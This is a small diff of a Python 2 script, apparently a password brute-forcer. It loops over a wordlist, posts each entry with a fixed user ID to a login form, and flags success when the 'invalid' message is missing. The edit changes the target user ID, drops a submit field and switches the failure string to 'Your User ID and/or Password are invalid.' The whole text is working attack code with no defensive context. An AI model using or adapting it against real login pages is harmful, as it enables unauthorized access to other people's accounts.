@@ -20,13 +20,11 @@ for x in file.readlines():
 	x = x.strip()
 	print "Trying " + x
 	data1 = {
-		list_variabel_input[1] : "p00000013581",
-		list_variabel_input[2] : "%s" %x,
-		"submit" : "kirim"
+		list_variabel_input[1] : "p00000019178",
+		list_variabel_input[2] : "%s" %x
 	}
 	print data1
 	response = requests.post(input1, data1)
-	if "Something wrong" not in response.text:
+	if "Your User ID and/or Password are invalid." not in response.text:
 		print x + " Success!"
-		print(response.text)
 		break	
